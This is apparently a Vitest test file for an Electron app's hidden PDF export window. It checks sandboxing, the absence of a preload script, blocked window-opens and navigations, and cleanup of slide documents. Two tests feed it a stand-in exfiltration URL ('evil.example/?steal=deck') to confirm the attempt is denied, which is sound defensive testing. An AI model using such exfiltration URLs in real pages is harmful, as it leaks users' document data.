import { afterEach, describe, expect, it, vi } from 'vitest'

/**
 * `electron-renderer.ts` is the export module that touches `electron` at module scope, so — like
 * `slide/protocol.ts` — it is unreachable without `vi.mock('electron')`. The properties worth pinning
 * here are the security-relevant ones: the window's locked `webPreferences`, that the slide is loaded
 * over `slide://` (the same secure delivery as the canvas, never a weaker path), that the locked
 * print options are used, and that every published document is revoked whether the print succeeds or
 * throws.
 */

type WindowOpenHandler = (details: { url: string }) => { action: string }
type NavListener = (event: { preventDefault: () => void }, url: string) => void

const mocks = vi.hoisted(() => {
  const instances: FakeWindow[] = []
  class FakeWindow {
    static readonly instances: FakeWindow[] = instances
    readonly options: unknown
    destroyed = false
    windowOpenHandler: WindowOpenHandler | undefined
    readonly listeners = new Map<string, NavListener[]>()
    readonly webContents = {
      id: 500 + instances.length,
      setZoomFactor: vi.fn((_factor: number): void => undefined),
      setWindowOpenHandler: vi.fn((handler: WindowOpenHandler): void => {
        this.windowOpenHandler = handler
      }),
      on: vi.fn((event: string, listener: NavListener): unknown => {
        const bucket = this.listeners.get(event) ?? []
        bucket.push(listener)
        this.listeners.set(event, bucket)
        return this.webContents
      }),
      loadURL: vi.fn((_url: string): Promise<void> => Promise.resolve()),
      executeJavaScript: vi.fn((_code: string, _userGesture?: boolean): Promise<unknown> =>
        Promise.resolve(true),
      ),
      printToPDF: vi.fn((_options: unknown): Promise<Buffer> =>
        Promise.resolve(Buffer.from('%PDF-1.7 fake')),
      ),
    }
    constructor(options: unknown) {
      this.options = options
      instances.push(this)
    }
    /** Fire a captured event listener (e.g. `will-navigate`) and report whether it was prevented. */
    emit(event: string, url: string): boolean {
      let prevented = false
      const evt = {
        preventDefault: () => {
          prevented = true
        },
      }
      for (const listener of this.listeners.get(event) ?? []) listener(evt, url)
      return prevented
    }
    menuRemoved = false
    removeMenu(): void {
      this.menuRemoved = true
    }
    isDestroyed(): boolean {
      return this.destroyed
    }
    destroy(): void {
      this.destroyed = true
    }
  }
  return { FakeWindow, instances }
})

vi.mock('electron', () => ({ BrowserWindow: mocks.FakeWindow }))

const { createOffscreenPdfRenderer } = await import('../../../src/main/export/electron-renderer')
const { SlideRegistry } = await import('../../../src/main/slide/registry')
const { slideDocumentUrl, slideDocumentIdFromUrl, isSlideDocumentId } =
  await import('../../../src/shared/slide-protocol')

afterEach(() => {
  mocks.instances.length = 0
  vi.clearAllMocks()
})

describe('createOffscreenPdfRenderer', () => {
  it('creates one locked-down hidden window and reuses it across renders', async () => {
    const registry = new SlideRegistry()
    const renderer = createOffscreenPdfRenderer(registry)
    await renderer.renderToPdf('<!doctype html><body>a', 0)
    await renderer.renderToPdf('<!doctype html><body>b', 0)

    expect(mocks.instances).toHaveLength(1)
    const options = mocks.instances[0]!.options as {
      show: boolean
      useContentSize: boolean
      webPreferences: Record<string, unknown>
    }
    expect(options.show).toBe(false)
    expect(options.useContentSize).toBe(true)
    expect(options.webPreferences).toMatchObject({
      offscreen: false,
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: true,
      backgroundThrottling: false,
    })
    // No preload is exposed to the export window — the slide reaches neither app nor bridge.
    expect(options.webPreferences['preload']).toBeUndefined()
    // Parity with the editor window's locked set: no node integration, sandbox on, no webview tag.
    expect(options.webPreferences['nodeIntegration']).toBe(false)
    expect(options.webPreferences['sandbox']).toBe(true)
    expect(options.webPreferences['webviewTag']).toBe(false)
    renderer.dispose()
  })

  it('removes the menu bar: on Linux it sits inside the content area and crops the 1280×720 slide', async () => {
    const registry = new SlideRegistry()
    const renderer = createOffscreenPdfRenderer(registry)
    await renderer.renderToPdf('<!doctype html><body>x', 0)
    // Measured under WSLg (M4.8a harness): with the default menu the window settled to a 1280×693
    // viewport and `capturePage` returned 693 rows. Mutation: delete `win.removeMenu()` → reds.
    expect(mocks.instances[0]!.menuRemoved).toBe(true)
    renderer.dispose()
  })

  it('denies every window-open on the export window (a slide cannot open a window)', async () => {
    const registry = new SlideRegistry()
    const renderer = createOffscreenPdfRenderer(registry)
    await renderer.renderToPdf('<!doctype html><body>x', 0)

    const win = mocks.instances[0]!
    expect(win.webContents.setWindowOpenHandler).toHaveBeenCalledOnce()
    expect(win.windowOpenHandler).toBeDefined()
    // Whatever URL a slide asks to open — including an exfiltration attempt — is denied.
    expect(win.windowOpenHandler!({ url: 'http://evil.example/?steal=deck' })).toEqual({
      action: 'deny',
    })
    expect(win.windowOpenHandler!({ url: 'about:blank' })).toEqual({ action: 'deny' })
    renderer.dispose()
  })

  it('blocks every renderer-initiated navigation off the loaded slide document', async () => {
    const registry = new SlideRegistry()
    const renderer = createOffscreenPdfRenderer(registry)
    await renderer.renderToPdf('<!doctype html><body>x', 0)

    const win = mocks.instances[0]!
    expect(win.webContents.on).toHaveBeenCalledWith('will-navigate', expect.any(Function))
    // A slide doing `location.href = 'http://evil?='+data` is prevented.
    expect(win.emit('will-navigate', 'http://evil.example/?steal=deck')).toBe(true)
    // Even a sibling slide:// navigation is prevented — export needs no in-page navigation at all.
    expect(win.emit('will-navigate', 'slide://deadbeef/')).toBe(true)
    renderer.dispose()
  })

  it('serves the slide over slide:// and prints with the locked options', async () => {
    const registry = new SlideRegistry()
    const renderer = createOffscreenPdfRenderer(registry)
    const bytes = await renderer.renderToPdf('<!doctype html><body>hi', 0)

    const win = mocks.instances[0]!
    const loadedUrl = win.webContents.loadURL.mock.calls[0]?.[0] as string
    expect(loadedUrl.startsWith('slide://')).toBe(true)
    const id = slideDocumentIdFromUrl(loadedUrl) ?? ''
    expect(isSlideDocumentId(id)).toBe(true)
    expect(loadedUrl).toBe(slideDocumentUrl(id))

    // The readiness barrier ran before printing.
    expect(win.webContents.executeJavaScript).toHaveBeenCalledOnce()

    const printOptions = win.webContents.printToPDF.mock.calls[0]?.[0] as {
      printBackground: boolean
      margins: Record<string, number>
    }
    expect(printOptions.printBackground).toBe(true)
    expect(printOptions.margins).toEqual({ top: 0, bottom: 0, left: 0, right: 0 })

    expect(bytes).toBeInstanceOf(Uint8Array)
    renderer.dispose()
  })

  it('revokes the published document after a successful print (peak memory = one slide)', async () => {
    const registry = new SlideRegistry()
    const renderer = createOffscreenPdfRenderer(registry)
    await renderer.renderToPdf('<!doctype html><body>x', 0)
    expect(registry.size).toBe(0)
    renderer.dispose()
  })

  it('revokes the published document even when printToPDF throws', async () => {
    const registry = new SlideRegistry()
    const renderer = createOffscreenPdfRenderer(registry)
    // First render creates the window and succeeds; then make the next print fail.
    await renderer.renderToPdf('<!doctype html><body>x', 0)
    mocks.instances[0]!.webContents.printToPDF.mockRejectedValueOnce(new Error('print failed'))
    await expect(renderer.renderToPdf('<!doctype html><body>y', 0)).rejects.toThrow('print failed')
    // The failed slide's document is still released — no leak on the error path.
    expect(registry.size).toBe(0)
    renderer.dispose()
  })

  it('rejects (does not print) when the registry refuses the publish', async () => {
    const registry = new SlideRegistry({ limits: { maxDocuments: 0 } })
    const renderer = createOffscreenPdfRenderer(registry)
    await expect(renderer.renderToPdf('<!doctype html><body>x', 0)).rejects.toThrow(
      /could not publish/,
    )
    // A window may have been created, but nothing was printed.
    if (mocks.instances[0]) {
      expect(mocks.instances[0].webContents.printToPDF).not.toHaveBeenCalled()
    }
    renderer.dispose()
  })

  it('clears the readiness timeout once the barrier settles (no timer outlives the race)', async () => {
    const clearSpy = vi.spyOn(globalThis, 'clearTimeout')
    const registry = new SlideRegistry()
    const renderer = createOffscreenPdfRenderer(registry)
    // The barrier resolves via executeJavaScript (mocked to resolve immediately), so the 6 s timer
    // must be cleared rather than left pending.
    await renderer.renderToPdf('<!doctype html><body>x', 0)
    expect(clearSpy).toHaveBeenCalled()
    clearSpy.mockRestore()
    renderer.dispose()
  })

  it('dispose destroys the window and releases anything it still owned', async () => {
    const registry = new SlideRegistry()
    const renderer = createOffscreenPdfRenderer(registry)
    await renderer.renderToPdf('<!doctype html><body>x', 0)
    renderer.dispose()
    expect(mocks.instances[0]!.destroyed).toBe(true)
    // Idempotent.
    renderer.dispose()
  })
})
